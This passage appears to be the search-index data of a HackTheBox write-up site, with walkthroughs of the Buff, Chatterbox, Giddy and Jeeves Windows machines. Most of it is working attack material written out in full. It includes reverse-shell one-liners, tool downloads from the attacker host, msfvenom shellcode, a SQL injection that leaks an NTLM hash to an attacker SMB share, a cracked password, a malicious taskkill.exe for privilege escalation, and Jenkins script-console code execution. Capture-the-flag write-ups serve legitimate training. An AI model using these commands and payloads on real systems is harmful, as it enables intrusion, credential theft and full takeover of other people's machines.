http://10.10.10.198:8080/\n            /\\\n/vvvvvvvvvvvv \\--------------------------------------,                                                 \n`^^^^^^^^^^^^ /============BOKU=====================\"\n            \\/\n\n[+] Successfully connected to webshell.\nC:\\xampp\\htdocs\\gym\\upload&gt; whoami\n\ufffdPNG\n\u2592\nbuff\\shaun\n</code></pre> <p>Get the flag:</p> <pre><code>C:\\xampp\\htdocs\\gym\\upload&gt; type C:\\users\\shaun\\desktop\\user.txt\n\ufffdPNG\n\u2592\n47643683f9c91176910ec622fc4b20f9\n</code></pre>","tags":["\ud83d\udcce Windows","\ud83d\udce6 HackTheBox","HackTheBox","Windows"]},{"location":"buff/#privilege-escalation","title":"Privilege Escalation","text":"<p>Transfer <code>nc.exe</code> to the host and get a reverse shell</p> <pre><code>C:\\xampp\\htdocs\\gym\\upload&gt; powershell.exe -c iwr -uri http://10.10.14.14:8000/nc.exe -outfile C:\\users\\shau\n\ufffdPNG\n\u2592\n</code></pre> <pre><code>C:\\xampp\\htdocs\\gym\\upload&gt; C:\\users\\shaun\\nc.exe 10.10.14.14 5555 -e cmd.exe\n</code></pre> <pre><code>$ rlwrap nc -lnvp 5555\nlistening on [any] 5555 ...\nconnect to [10.10.14.14] from (UNKNOWN) [10.10.10.198] 49833\nMicrosoft Windows [Version 10.0.17134.1610]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\xampp\\htdocs\\gym\\upload&gt;whoami\nwhoami\nbuff\\shaun\n</code></pre> <p>There is a <code>CloudMe_1112.exe</code> in <code>shaun</code>'s downloads folder. We can see in the official documentation that the default port is <code>8888</code>.</p> <pre><code>PS C:\\users\\shaun\\downloads&gt; netstat -ano | findstr 8888\nnetstat -ano | findstr 8888\n  TCP    127.0.0.1:8888         0.0.0.0:0              LISTENING       4996\n</code></pre> <p>Transfer <code>chisel</code> to expose the port.</p> <pre><code>$ ./chisel server --port 5555 --reverse                        \n2025/06/05 23:07:25 server: Reverse tunnelling enabled\n2025/06/05 23:07:25 server: Fingerprint PfHQvvl62LmfoeerrJeKwQTGw8wsiz5DkAonqhI5IYA=\n2025/06/05 23:07:25 server: Listening on http://0.0.0.0:5555\n2025/06/05 23:08:59 server: session#1: tun: proxy#R:8888=&gt;localhost:8888: Listening\n</code></pre> <pre><code>PS C:\\users\\shaun\\downloads&gt; iwr -uri http://10.10.14.14:8000/chisel.exe -outfile chisel.exe\niwr -uri http://10.10.14.14:8000/chisel.exe -outfile chisel.exe\nPS C:\\users\\shaun\\downloads&gt; .\\chisel.exe client 10.10.14.14:5555 R:8888:localhost:8888\n.\\chisel.exe client 10.10.14.14:5555 R:8888:localhost:8888\n2025/06/05 22:09:00 client: Connecting to ws://10.10.14.14:5555\n2025/06/05 22:09:00 client: Connected (Latency 40.8734ms)\n</code></pre> <p>Using <code>searchsploit</code>:</p> <p></p> <p>Get the first one and edit it; we need to change the payload from executing the calculator to a reverse shell.</p> <pre><code>$ msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=443 -b '\\x00\\x0A\\x0D' -f python -v payload\n</code></pre> <p>Set the listener and execute the script.</p> <pre><code>$ sudo rlwrap nc -lnvp 443                     \n[sudo] password for kali: \nlistening on [any] 443 ...\nconnect to [10.10.14.14] from (UNKNOWN) [10.10.10.198] 49935\nMicrosoft Windows [Version 10.0.17134.1610]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32&gt;whoami\nwhoami\nbuff\\administrator\n</code></pre>","tags":["\ud83d\udcce Windows","\ud83d\udce6 HackTheBox","HackTheBox","Windows"]},{"location":"buff/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag:</p> <pre><code>C:\\Users\\Administrator\\Desktop&gt;type root.txt\ntype root.txt\nd9125a41ab7239a80a93d04b6999f906\n</code></pre>","tags":["\ud83d\udcce Windows","\ud83d\udce6 HackTheBox","HackTheBox","Windows"]},{"location":"chatterbox/","title":"Chatterbox","text":"","tags":["\ud83d\udcce Windows","\ud83d\udce6 HackTheBox","HackTheBox","Windows"]},{"location":"chatterbox/#enumeration","title":"Enumeration","text":"<pre><code>$ nmap -A -T4 --min-rate 5000 -p- -n -Pn --open 10.10.10.74\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-13 12:57 CEST\nNmap scan report for 10.10.10.74\nHost is up (0.040s latency).\nNot shown: 64601 closed tcp ports (reset), 923 filtered tcp ports (no-response)\nSome closed ports may be reported as filtered due to --defeat-rst-ratelimit\nPORT      STATE SERVICE      VERSION\n135/tcp   open  msrpc        Microsoft Windows RPC\n139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn\n445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)\n9255/tcp  open  mon?\n9256/tcp  open  unknown\n49152/tcp open  msrpc        Microsoft Windows RPC\n49153/tcp open  msrpc        Microsoft Windows RPC\n49154/tcp open  msrpc        Microsoft Windows RPC\n49155/tcp open  msrpc        Microsoft Windows RPC\n49156/tcp open  msrpc        Microsoft Windows RPC\n49157/tcp open  msrpc        Microsoft Windows RPC\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\n\n\nNetwork Distance: 2 hops\nService Info: Host: CHATTERBOX; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb-os-discovery: \n|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)\n|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional\n|   Computer name: Chatterbox\n|   NetBIOS computer name: CHATTERBOX\\x00\n|   Workgroup: WORKGROUP\\x00\n|_  System time: 2025-06-13T11:58:58-04:00\n|_clock-skew: mean: 6h20m00s, deviation: 2h18m35s, median: 4h59m59s\n| smb2-time: \n|   date: 2025-06-13T15:58:57\n|_  start_date: 2025-06-13T00:27:44\n| smb-security-mode: \n|   account_used: &lt;blank&gt;\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n| smb2-security-mode: \n|   2:1:0: \n|_    Message signing enabled but not required\n</code></pre> <p>Investigating the <code>ports</code>, we find that the program running is <code>achat</code>. Using <code>searchsploit</code>, get the first one, <code>rbo</code>.</p> <p></p> <p>Following the exploit, generate the payload with <code>msfvenom</code>.</p> <pre><code>$ msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.14.17 LPORT=443 -e x86/unicode_mixed -b '\\x00\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff' BufferRegister=EAX -f python\nFound 1 compatible encoders\nAttempting to encode payload with 1 iterations of x86/unicode_mixed\nx86/unicode_mixed succeeded with size 774 (iteration=0)\nx86/unicode_mixed chosen with final size 774\nPayload size: 774 bytes\nFinal size of python file: 3822 bytes\nbuf =  b\"\"\nbuf += b\"\\x50\\x50\\x59\\x41\\x49\\x41\\x49\\x41\\x49\\x41\\x49\\x41\"\nbuf += b\"\\x49\\x41\\x49\\x41\\x49\\x41\\x49\\x41\\x49\\x41\\x49\\x41\"\nbuf += b\"\\x49\\x41\\x49\\x41\\x49\\x41\\x49\\x41\\x6a\\x58\\x41\\x51\"\nbuf += b\"\\x41\\x44\\x41\\x5a\\x41\\x42\\x41\\x52\\x41\\x4c\\x41\\x59\"\nbuf += b\"\\x41\\x49\\x41\\x51\\x41\\x49\\x41\\x51\\x41\\x49\\x41\\x68\"\nbuf += b\"\\x41\\x41\\x41\\x5a\\x31\\x41\\x49\\x41\\x49\\x41\\x4a\\x31\"\nbuf += b\"\\x31\\x41\\x49\\x41\\x49\\x41\\x42\\x41\\x42\\x41\\x42\\x51\"\nbuf += b\"\\x49\\x31\\x41\\x49\\x51\\x49\\x41\\x49\\x51\\x49\\x31\\x31\"\nbuf += b\"\\x31\\x41\\x49\\x41\\x4a\\x51\\x59\\x41\\x5a\\x42\\x41\\x42\"\nbuf += b\"\\x41\\x42\\x41\\x42\\x41\\x42\\x6b\\x4d\\x41\\x47\\x42\\x39\"\nbuf += b\"\\x75\\x34\\x4a\\x42\\x6b\\x4c\\x49\\x58\\x74\\x42\\x4b\\x50\"\nbuf += b\"\\x79\\x70\\x59\\x70\\x33\\x30\\x72\\x69\\x5a\\x45\\x70\\x31\"\nbuf += b\"\\x65\\x70\\x70\\x64\\x62\\x6b\\x50\\x50\\x70\\x30\\x42\\x6b\"\nbuf += b\"\\x6e\\x72\\x5a\\x6c\\x52\\x6b\\x52\\x32\\x4c\\x54\\x42\\x6b\"\nbuf += b\"\\x53\\x42\\x4f\\x38\\x4c\\x4f\\x44\\x77\\x70\\x4a\\x6e\\x46\"\nbuf += b\"\\x50\\x31\\x4b\\x4f\\x66\\x4c\\x4f\\x4c\\x53\\x31\\x71\\x6c\"\nbuf += b\"\\x4b\\x52\\x4e\\x4c\\x6d\\x50\\x66\\x61\\x56\\x6f\\x6a\\x6d\"\nbuf += b\"\\x6b\\x51\\x56\\x67\\x57\\x72\\x78\\x72\\x50\\x52\\x6f\\x67\"\nbuf += b\"\\x62\\x6b\\x72\\x32\\x7a\\x70\\x44\\x4b\\x4d\\x7a\\x4f\\x4c\"\nbuf += b\"\\x72\\x6b\\x6e\\x6c\\x5a\\x71\\x74\\x38\\x7a\\x43\\x4e\\x68\"\nbuf += b\"\\x4b\\x51\\x56\\x71\\x4f\\x61\\x32\\x6b\\x50\\x59\\x6b\\x70\"\nbuf += b\"\\x7a\\x61\\x68\\x53\\x72\\x6b\\x30\\x49\\x6a\\x78\\x78\\x63\"\nbuf += b\"\\x4e\\x5a\\x61\\x39\\x44\\x4b\\x6d\\x64\\x62\\x6b\\x6a\\x61\"\nbuf += b\"\\x68\\x56\\x6e\\x51\\x6b\\x4f\\x46\\x4c\\x57\\x51\\x46\\x6f\"\nbuf += b\"\\x6a\\x6d\\x4d\\x31\\x39\\x37\\x70\\x38\\x79\\x50\\x31\\x65\"\nbuf += b\"\\x68\\x76\\x79\\x73\\x31\\x6d\\x59\\x68\\x4f\\x4b\\x63\\x4d\"\nbuf += b\"\\x4f\\x34\\x62\\x55\\x48\\x64\\x6e\\x78\\x54\\x4b\\x51\\x48\"\nbuf += b\"\\x6c\\x64\\x6a\\x61\\x37\\x63\\x6f\\x76\\x34\\x4b\\x6c\\x4c\"\nbuf += b\"\\x4e\\x6b\\x62\\x6b\\x51\\x48\\x6b\\x6c\\x4b\\x51\\x49\\x43\"\nbuf += b\"\\x34\\x4b\\x4d\\x34\\x54\\x4b\\x4d\\x31\\x68\\x50\\x54\\x49\"\nbuf += b\"\\x71\\x34\\x6d\\x54\\x4c\\x64\\x4f\\x6b\\x31\\x4b\\x50\\x61\"\nbuf += b\"\\x50\\x59\\x70\\x5a\\x50\\x51\\x59\\x6f\\x6b\\x30\\x4f\\x6f\"\nbuf += b\"\\x6f\\x6f\\x61\\x4a\\x52\\x6b\\x5a\\x72\\x68\\x6b\\x44\\x4d\"\nbuf += b\"\\x31\\x4d\\x63\\x38\\x6c\\x73\\x4d\\x62\\x39\\x70\\x6d\\x30\"\nbuf += b\"\\x6f\\x78\\x63\\x47\\x52\\x53\\x4e\\x52\\x4f\\x6f\\x42\\x34\"\nbuf += b\"\\x42\\x48\\x6e\\x6c\\x50\\x77\\x4e\\x46\\x6c\\x47\\x39\\x6f\"\nbuf += b\"\\x5a\\x35\\x36\\x58\\x54\\x50\\x6d\\x31\\x39\\x70\\x6d\\x30\"\nbuf += b\"\\x6b\\x79\\x58\\x44\\x70\\x54\\x52\\x30\\x51\\x58\\x6b\\x79\"\nbuf += b\"\\x45\\x30\\x70\\x6b\\x6b\\x50\\x59\\x6f\\x49\\x45\\x70\\x50\"\nbuf += b\"\\x72\\x30\\x4e\\x70\\x4e\\x70\\x6f\\x50\\x30\\x50\\x4f\\x50\"\nbuf += b\"\\x30\\x50\\x73\\x38\\x57\\x7a\\x4a\\x6f\\x79\\x4f\\x39\\x50\"\nbuf += b\"\\x59\\x6f\\x5a\\x35\\x43\\x67\\x71\\x5a\\x4a\\x65\\x32\\x48\"\nbuf += b\"\\x79\\x7a\\x59\\x7a\\x5a\\x6e\\x4a\\x71\\x62\\x48\\x6c\\x42\"\nbuf += b\"\\x79\\x70\\x5a\\x61\\x45\\x6b\\x65\\x39\\x6a\\x46\\x72\\x4a\"\nbuf += b\"\\x5a\\x70\\x50\\x56\\x52\\x37\\x32\\x48\\x33\\x69\\x64\\x65\"\nbuf += b\"\\x33\\x44\\x6f\\x71\\x49\\x6f\\x48\\x55\\x45\\x35\\x57\\x50\"\nbuf += b\"\\x53\\x44\\x4a\\x6c\\x59\\x6f\\x30\\x4e\\x6a\\x68\\x62\\x55\"\nbuf += b\"\\x5a\\x4c\\x52\\x48\\x5a\\x50\\x47\\x45\\x56\\x42\\x72\\x36\"\nbuf += b\"\\x39\\x6f\\x59\\x45\\x62\\x48\\x62\\x43\\x30\\x6d\\x63\\x34\"\nbuf += b\"\\x6b\\x50\\x42\\x69\\x38\\x63\\x6e\\x77\\x4f\\x67\\x4f\\x67\"\nbuf += b\"\\x4d\\x61\\x5a\\x56\\x51\\x5a\\x6d\\x42\\x31\\x49\\x32\\x36\"\nbuf += b\"\\x47\\x72\\x6b\\x4d\\x63\\x36\\x37\\x57\\x4d\\x74\\x6c\\x64\"\nbuf += b\"\\x6d\\x6c\\x4a\\x61\\x6d\\x31\\x54\\x4d\\x61\\x34\\x4e\\x44\"\nbuf += b\"\\x6e\\x30\\x75\\x76\\x39\\x70\\x71\\x34\\x6f\\x64\\x30\\x50\"\nbuf += b\"\\x62\\x36\\x42\\x36\\x6e\\x76\\x6f\\x56\\x71\\x46\\x50\\x4e\"\nbuf += b\"\\x32\\x36\\x4e\\x76\\x72\\x33\\x42\\x36\\x53\\x38\\x31\\x69\"\nbuf += b\"\\x48\\x4c\\x6d\\x6f\\x71\\x76\\x4b\\x4f\\x78\\x55\\x71\\x79\"\nbuf += b\"\\x77\\x70\\x30\\x4e\\x62\\x36\\x51\\x36\\x79\\x6f\\x6e\\x50\"\nbuf += b\"\\x70\\x68\\x6d\\x38\\x51\\x77\\x6b\\x6d\\x63\\x30\\x49\\x6f\"\nbuf += b\"\\x66\\x75\\x55\\x6b\\x6c\\x30\\x44\\x75\\x56\\x42\\x50\\x56\"\nbuf += b\"\\x6f\\x78\\x36\\x46\\x52\\x75\\x47\\x4d\\x33\\x6d\\x59\\x6f\"\nbuf += b\"\\x79\\x45\\x4f\\x4c\\x79\\x76\\x43\\x4c\\x7a\\x6a\\x53\\x50\"\nbuf += b\"\\x6b\\x4b\\x77\\x70\\x73\\x45\\x6d\\x35\\x47\\x4b\\x31\\x37\"\nbuf += b\"\\x6e\\x33\\x31\\x62\\x62\\x4f\\x70\\x6a\\x6d\\x30\\x70\\x53\"\n</code></pre> <p>And change the server address.</p> <p></p> <p>But the exploit won't work; the machine seems broken as of today.</p> <pre><code>$ python3 36025.py\n----&gt;{P00F}!\n</code></pre> <p>Bug</p> <p>Machine out of service.</p>","tags":["\ud83d\udcce Windows","\ud83d\udce6 HackTheBox","HackTheBox","Windows"]},{"location":"giddy/","title":"Giddy","text":"","tags":["\ud83d\udcce Windows","\ud83d\udce6 HackTheBox","HackTheBox","Windows"]},{"location":"giddy/#enumeration","title":"Enumeration","text":"<pre><code>$ nmap -A -T4 --min-rate 5000 -p- -n -Pn --open 10.10.10.104\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-10 21:19 CEST\nNmap scan report for 10.10.10.104\nHost is up (0.040s latency).\nNot shown: 65531 filtered tcp ports (no-response)\nSome closed ports may be reported as filtered due to --defeat-rst-ratelimit\nPORT     STATE SERVICE       VERSION\n80/tcp   open  http          Microsoft IIS httpd 10.0\n|_http-server-header: Microsoft-IIS/10.0\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-title: IIS Windows Server\n443/tcp  open  ssl/http      Microsoft IIS httpd 10.0\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_ssl-date: 2025-06-10T19:20:24+00:00; 0s from scanner time.\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: IIS Windows Server\n| tls-alpn: \n|   h2\n|_  http/1.1\n| ssl-cert: Subject: commonName=PowerShellWebAccessTestWebSite\n| Not valid before: 2018-06-16T21:28:55\n|_Not valid after:  2018-09-14T21:28:55\n3389/tcp open  ms-wbt-server Microsoft Terminal Services\n|_ssl-date: 2025-06-10T19:20:24+00:00; 0s from scanner time.\n| rdp-ntlm-info: \n|   Target_Name: GIDDY\n|   NetBIOS_Domain_Name: GIDDY\n|   NetBIOS_Computer_Name: GIDDY\n|   DNS_Domain_Name: Giddy\n|   DNS_Computer_Name: Giddy\n|   Product_Version: 10.0.14393\n|_  System_Time: 2025-06-10T19:20:19+00:00\n| ssl-cert: Subject: commonName=Giddy\n| Not valid before: 2025-06-09T19:15:47\n|_Not valid after:  2025-12-09T19:15:47\n5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2012|2016|2008|7 (91%)\nOS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7\nAggressive OS guesses: Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2016 (89%), Microsoft Windows 7 or Windows Server 2008 R2 (85%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nTRACEROUTE (using port 3389/tcp)\nHOP RTT      ADDRESS\n1   39.84 ms 10.10.14.1\n2   40.07 ms 10.10.10.104\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 49.39 seconds\n</code></pre> <p>The webserver shows a picture of a dog.</p> <p></p> <p>Using <code>feroxbuster</code> we find <code>/remote</code> and <code>/mvc</code>.</p> <p></p> <p></p> <p>In <code>/mvc</code> we have a vulnerable SQLi parameter when searching.</p> <p></p> <p>There is a second point of injection in <code>product.aspx</code>, <code>productsubcategoryid</code>.</p>","tags":["\ud83d\udcce Windows","\ud83d\udce6 HackTheBox","HackTheBox","Windows"]},{"location":"giddy/#initial-access","title":"Initial Access","text":"<p>We can use <code>xp_dirtree</code> to try to get a hash. Start an SMB server and execute the query.</p> <pre><code>https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=18;%20EXEC%20MASTER.sys.xp_dirtree%20%27\\\\10.10.14.17\\kali\\test%27\n</code></pre> <pre><code>$ impacket-smbserver -smb2support kali .\nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Config file parsed\n[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0\n[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0\n[*] Config file parsed\n[*] Config file parsed\n[*] Incoming connection (10.10.10.104,49710)\n[*] AUTHENTICATE_MESSAGE (GIDDY\\Stacy,GIDDY)\n[*] User GIDDY\\Stacy authenticated successfully\n[*] Stacy::GIDDY:aaaaaaaaaaaaaaaa:a2460a71e3840477bcdba3394bf65d21:0101000000000000801b394ec4dbdb0109baf7b5a3abbf04000000000100100079006e0049006f004a005200680058000300100079006e0049006f004a005200680058000200100043005700410067007a0062006c0068000400100043005700410067007a0062006c00680007000800801b394ec4dbdb01060004000200000008003000300000000000000000000000003000007c1be546a3f4e42191147ba215b5e89f3f388bf71cc4bc9a355f1bce1c1765ba0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0031003700000000000000000000000000\n</code></pre> <p>Using <code>john</code>:</p> <pre><code>$ john --wordlist=/usr/share/wordlists/rockyou.txt hash  \nUsing default input encoding: UTF-8\nLoaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])\nWill run 2 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nxNnWo6272k7x     (Stacy)     \n1g 0:00:00:01 DONE (2025-06-12 20:10) 0.6250g/s 1680Kp/s 1680Kc/s 1680KC/s xabat..x9831915x\nUse the \"--show --format=netntlmv2\" options to display all of the cracked passwords reliably\nSession completed. \n</code></pre> <p><code>Stacy:xNnWo6272k7x</code></p> <p>Testing credentials with <code>nxc</code>:</p> <p></p> <pre><code>$ evil-winrm -i 10.10.10.104 -u stacy -p xNnWo6272k7x\n\nEvil-WinRM shell v3.7\n\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\Stacy\\Documents&gt; whoami\ngiddy\\stacy\n</code></pre> <p>Get the flag:</p> <pre><code>*Evil-WinRM* PS C:\\Users\\Stacy\\desktop&gt; type user.txt\n5a7edac0ca154dcfa80ec0b5010112ab\n</code></pre>","tags":["\ud83d\udcce Windows","\ud83d\udce6 HackTheBox","HackTheBox","Windows"]},{"location":"giddy/#privilege-escalation","title":"Privilege Escalation","text":"<p>The user's document folder has a <code>unifivideo</code> file:</p> <pre><code>*Evil-WinRM* PS C:\\Users\\Stacy\\documents&gt; ls\n\n\n    Directory: C:\\Users\\Stacy\\documents\n\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\n-a----        6/17/2018   9:36 AM              6 unifivideo\n</code></pre> <p>Searching with <code>searchsploit</code>:</p> <p></p> <pre><code>5. VULNERABILITY DETAILS\n========================\nUbiquiti UniFi Video for Windows is installed to \"C:\\ProgramData\\unifi-video\\\"\nby default and is also shipped with a service called \"Ubiquiti UniFi Video\". Its\nexecutable \"avService.exe\" is placed in the same directory and also runs under\nthe NT AUTHORITY/SYSTEM account.\n\nHowever the default permissions on the \"C:\\ProgramData\\unifi-video\" folder are\ninherited from \"C:\\ProgramData\" and are not explicitly overridden, which allows\nall users, even unprivileged ones, to append and write files to the application\ndirectory:\n\nc:\\ProgramData&gt;icacls unifi-video\nunifi-video NT AUTHORITY\\SYSTEM:(I)(OI)(CI)(F)\nBUILTIN\\Administrators:(I)(OI)(CI)(F)\nCREATOR OWNER:(I)(OI)(CI)(IO)(F)\nBUILTIN\\Users:(I)(OI)(CI)(RX)\nBUILTIN\\Users:(I)(CI)(WD,AD,WEA,WA)\n\nUpon start and stop of the service, it tries to load and execute the file at\n\"C:\\ProgramData\\unifi-video\\taskkill.exe\". However this file does not exist in\nthe application directory by default at all.\n\nBy copying an arbitrary \"taskkill.exe\" to \"C:\\ProgramData\\unifi-video\\\" as an\nunprivileged user, it is therefore possible to escalate privileges and execute\narbitrary code as NT AUTHORITY/SYSTEM.\n</code></pre> <p>So we can create a <code>taskkill.exe</code> and put it in the folder, restart the service, and the malicious exe will be executed.</p> <pre><code>$ cat taskkill.c                  \n#include \"stdlib.h\"\n\nint main()\n{\n    system(\"C:\\\\programdata\\\\unifi-video\\\\nc.exe -e cmd.exe 10.10.14.17 4444\");\n}\n</code></pre> <pre><code>$ x86_64-w64-mingw32-gcc taskkill.c -o taskkill.exe\n</code></pre> <p>Upload <code>nc.exe</code> and <code>taskkill.exe</code>:</p> <pre><code>*Evil-WinRM* PS C:\\programdata\\unifi-video&gt; certutil -f -split -urlcache http://10.10.14.17:8000/taskkill.exe\n*Evil-WinRM* PS C:\\programdata\\unifi-video&gt; certutil -f -split -urlcache http://10.10.14.17:8000/nc.exe\n</code></pre> <p>Start and stop the service and start the listener:</p> <pre><code>*Evil-WinRM* PS C:\\programdata\\unifi-video&gt; stop-service -name \"Ubiquiti Unifi Video\"\nWarning: Waiting for service 'Ubiquiti Unifi Video (UniFiVideoService)' to stop...\nWarning: Waiting for service 'Ubiquiti Unifi Video (UniFiVideoService)' to stop...\nWarning: Waiting for service 'Ubiquiti Unifi Video (UniFiVideoService)' to stop...\n*Evil-WinRM* PS C:\\programdata\\unifi-video&gt; start-service -name \"Ubiquiti Unifi Video\"\n</code></pre> <pre><code>$ rlwrap nc -lnvp 4444\nlistening on [any] 4444 ...\nconnect to [10.10.14.17] from (UNKNOWN) [10.10.10.104] 49819\nMicrosoft Windows [Version 10.0.14393]\n(c) 2016 Microsoft Corporation. All rights reserved.\n\nC:\\ProgramData\\unifi-video&gt;whoami\nwhoami\nnt authority\\system\n</code></pre>","tags":["\ud83d\udcce Windows","\ud83d\udce6 HackTheBox","HackTheBox","Windows"]},{"location":"giddy/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag:</p> <pre><code>C:\\Users\\Administrator\\Desktop&gt;type root.txt\ntype root.txt\n5c5d6c15aad3a052570839b7d8b45473\n</code></pre>","tags":["\ud83d\udcce Windows","\ud83d\udce6 HackTheBox","HackTheBox","Windows"]},{"location":"jeeves/","title":"Jeeves","text":"","tags":["\ud83d\udcce Windows","\ud83d\udce6 HackTheBox","HackTheBox","Windows"]},{"location":"jeeves/#enumeration","title":"Enumeration","text":"<pre><code>$ nmap -A -T4 --min-rate 5000 -p- -n -Pn --open 10.10.10.63\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-13 00:16 CEST\nNmap scan report for 10.10.10.63\nHost is up (0.041s latency).\nNot shown: 65531 filtered tcp ports (no-response)\nSome closed ports may be reported as filtered due to --defeat-rst-ratelimit\nPORT      STATE SERVICE      VERSION\n80/tcp    open  http         Microsoft IIS httpd 10.0\n|_http-server-header: Microsoft-IIS/10.0\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-title: Ask Jeeves\n135/tcp   open  msrpc        Microsoft Windows RPC\n445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)\n50000/tcp open  http         Jetty 9.4.z-SNAPSHOT\n|_http-title: Error 404 Not Found\n|_http-server-header: Jetty(9.4.z-SNAPSHOT)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows 10 1607 (89%), Microsoft Windows Server 2008 R2 (89%), Microsoft Windows 11 (86%), Microsoft Windows 8.1 Update 1 (86%), Microsoft Windows Phone 7.5 or 8.0 (86%), Microsoft Windows Vista or Windows 7 (86%), Microsoft Windows Server 2008 R2 or Windows 7 SP1 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: mean: 4h59m59s, deviation: 0s, median: 4h59m59s\n| smb-security-mode: \n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n| smb2-time: \n|   date: 2025-06-13T03:17:32\n|_  start_date: 2025-06-13T03:16:20\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled but not required\n\nTRACEROUTE (using port 80/tcp)\nHOP RTT      ADDRESS\n1   40.72 ms 10.10.14.1\n2   40.82 ms 10.10.10.63\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 78.63 seconds\n</code></pre> <p>Website is about a web searcher</p> <p></p> <p>Upon searching, it shows an error image.</p> <p></p> <p>Port <code>50000</code> shows an error and the Jetty version.</p> <p></p> <p>Using <code>feroxbuster</code>, we find <code>/askjeeves</code>.</p> <p></p> <p><code>/askjeeves</code> is a Jenkins instance <code>2.87</code>.</p> <p></p>","tags":["\ud83d\udcce Windows","\ud83d\udce6 HackTheBox","HackTheBox","Windows"]},{"location":"jeeves/#initial-access","title":"Initial Access","text":"<p>We can go to the script console.</p> <p></p> <p>The easiest way is to put a base64-encoded PowerShell reverse shell.</p> <p>Or we can also get <code>nc.exe</code> from an SMB share and connect back to a port.</p> <pre><code>println \"\\\\\\\\10.10.14.17\\\\kali\\\\nc.exe -e cmd 10.10.14.17 443\".execute().text\n</code></pre> <p>Either way,</p> <pre><code>$ sudo rlwrap nc -lnvp 80\n[sudo] password for kali: \nlistening on [any] 80 ...\nconnect to [10.10.14.17] from (UNKNOWN) [10.10.10.63] 49678\nwhoami\njeeves\\kohsuke\n</code></pre> <p>Get the flag:</p> <pre><code>PS C:\\users\\kohsuke\\desktop&gt; type user.txt\ne3232272596fb47950d59c4cf1e7066a\n</code></pre>","tags":["\ud83d\udcce Windows","\ud83d\udce6 HackTheBox","HackTheBox","Windows"]},{"location":"jeeves/#privilege-escalation","title":"Privilege Escalation","text":"<p>There is a KeePass file inside <code>documents</code>.</p> <pre><code>PS 